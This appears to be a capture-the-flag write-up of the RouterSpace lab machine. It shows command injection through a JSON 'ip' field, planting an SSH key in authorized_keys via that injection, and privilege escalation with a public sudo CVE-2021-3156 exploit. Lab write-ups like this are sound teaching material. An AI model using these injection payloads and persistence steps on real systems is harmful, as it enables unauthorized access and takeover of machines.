# RouterSpace
---
Initial configuration for this machine was very annoying, but once i got anbox working correctly it was rather straight forward.

Nmap done: 1 IP address (1 host up) scanned in 80.07 seconds</pre>

From nmap, we can see SSH on Port 22, and a HTTP server on port 80. Browsing to the website, we are met with the following landing page:

![HomePage](/assets/img/Icons/RouterSpace/routerspacewebpage.png)

The site displays information on an application called RouterSpace,  that can connect routers to routerspace. The site allows us to download `routerspace.apk`, an android application.

## Installing the APK
Originally, i tried to do this using `genymotion`, however i was unsuccessful in capturing any requests from the application in burp. Due to this, i changed to `anbox`, and had much more success.

### Installing Anbox
I used the following guide to install anbox on my Kali VM:

https://dev.to/sbellone/how-to-install-anbox-on-debian-1hjd

I also downloaded the recommended anbox android image from:

https://build.anbox.io/android-images/2018/07/19/

Once anbox was installed, i installed the `routerspace.apk` package into anbox using:

`adb install routerspace.apk`

I then launched anbox, ran routerspace and was presented with an application screen with a "Check Status" button:

![app](/assets/img/Icons/RouterSpace/routerspaceapp.png)

So i decided to try and capture the request with burp.

### Burp
After launching burp, i went to Proxy Options > Proxy Listeners. I added a listener on port 8000, using my tun0 IP address `10.10.14.49`.

![burp](/assets/img/Icons/RouterSpace/burp-listener.png)

Now i needed to add the burp proxy to anbox, and i did this using 

`adb shell settings put global http_proxy 10.10.14.49:8000`

Now when clicking "Check Status", burp caught the POST request and returned the following:

![burp2](/assets/img/Icons/RouterSpace/burp-POST.png)

I then sent this request to repeater, and played around with the request. By editing the JSON ip field, and inputting a `;`, i was able to input a command and the remote target would execute it. For this POST request, i used `"IP":";whoami"`, and in the responce received `"\npaul\n"`. 
![burp3](/assets/img/Icons/RouterSpace/burp-lspaul.png)

Knowing that the user is Paul, lets have a look inside his directory:

![burp4](/assets/img/Icons/RouterSpace/burp-whoami.png)

We can see a user.txt, but when trying to cat it, the resulting hash is the incorrect flag.
## Exploiting RouterSpace
From here, i tried executing different commands to attempt to launch a reverse shell, but i was unable too. This got me thinking about a potential SSH foothold, due to port 22 being open. Lets see if Paul has a .ssh directory
`"ip":";ls -la /home/paul/.ssh"`

![burp5](/assets/img/Icons/RouterSpace/burp-sshresponce.png)

There is a .ssh directory, but there is no public `id_rsa` key within it, which means i can potentially add my own, and then SSH into the target host.

### SSH Key Generation
To generate the keys needed, i ran `ssh-keygen` within the `.ssh` directory.
<pre>
‚îå‚îÄ‚îÄ(rootüíÄKali)-[~/.ssh]
‚îî‚îÄ# ssh-keygen                                                                             
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa
Your public key has been saved in id_rsa.pub
The key fingerprint is:
SHA256:yEFblsfeIJdPKDEX6Xo1saLB0SZuwo60ARI3wetYseU root@NTAKali
The key's randomart image is:
+---[RSA 3072]----+
|.o+.  . ==o=     |
|..+... +*o@ o    |
| . B .oo @ = o   |
|  + E.oo= + *    |
| + . =ooS+ o .   |
|. . o . o .      |
|         .       |
|                 |
|                 |
+----[SHA256]-----+
</pre>

And now below we can see our key.

<pre>
‚îå‚îÄ‚îÄ(rootüíÄNTAKali)-[~/.ssh]
‚îî‚îÄ# ls

‚îå‚îÄ‚îÄ(rootüíÄNTAKali)-[~/.ssh]
‚îî‚îÄ# cat id_rsa.pub

</pre>

### Adding key to target host
Using burp, i can echo the key into the `.ssh` directory, in a file called `authoried_keys` using:

`{"ip":";echo '<Generated Key>' >> /home/paul/.ssh/authorized_keys"}`

![burp](/assets/img/Icons/RouterSpace/burp-adding-sshkey.png)

As we can see from the image below, the file was created. However, as a Brit, i spelt the directory wrong and used an `s` instead of a `z` - Oops.

![burp](/assets/img/Icons/RouterSpace/burp-wrong-s.png)

From here, i re-uploaded the key to the correct directory, and attempted to connect via SSH.

<pre>
‚îå‚îÄ‚îÄ(rootüíÄNTAKali)-[~]

Once SSH'd in, it's as simple as reading the user.txt file.
<pre>
paul@routerspace:~$ cat user.txt

</pre>

## Priveledge Esculation
Once i had gained a foothold, i attempted to download `linpeas.sh` on the target host. However after setting up the python server, the target host was unable to connect to it to download the file.

<pre>paul@routerspace:~$ wget http://10.10.14.49:4444/linpeas.sh
--2022-03-08 00:34:13--  http://10.10.14.49:4444/linpeas.sh
Connecting to 10.10.14.49:4444... ^C
paul@routerspace:~$
</pre>

Instead, i can use Secure Copy `scp` to upload the file from my local host to the target host over port 22.

`scp -P 22 ../Desktop/linpeas.sh paul@10.10.11.148:/home/paul`

![linpeas](/assets/img/Icons/RouterSpace/linpeas-proof.png)

Initially, i attempted to use PwnKit on the machine, as linpeas recommended it.

After looking through linpeas again, i noticed that the host is running a vulnerable version of sudo `1.8.31`, but for some reason linpeas didn't report the CVE issue. 
![sudo](/assets/img/Icons/RouterSpace/sudo-version.png)
One way to test whether sudo is vulnerable to CVE-2021-3156 or not is to run `sudoedit -s /`, if sudo asks for the users password, it is likely vulnerable.

After googling exploits related to the CVE, i decided to use the following exploit:
https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit

After downloading the file to my host machine and unzipping it, i transffered the files over via scp like before. After, i ran `make` which created an `exploit` executable. Running this executable elevated me to root!


<pre>
paul@routerspace:~/test$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
